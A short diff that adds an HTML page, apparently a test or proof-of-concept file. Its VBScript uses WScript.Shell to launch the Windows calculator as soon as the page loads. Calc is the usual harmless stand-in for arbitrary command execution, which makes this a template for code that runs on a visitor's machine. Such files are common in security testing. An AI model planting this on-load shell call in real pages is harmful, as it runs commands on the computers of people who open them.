@@ -1,0 +1,14 @@
+<html>
+<head>
+<script language="vbscript" >
+Function test
+   Dim t
+   Set t = CreateObject("WScript.Shell")
+   t.Run "calc",1,True
+   set t = nothing
+End Function
+</script>
+</head>
+
+<body onLoad="test"></body>
+</html>
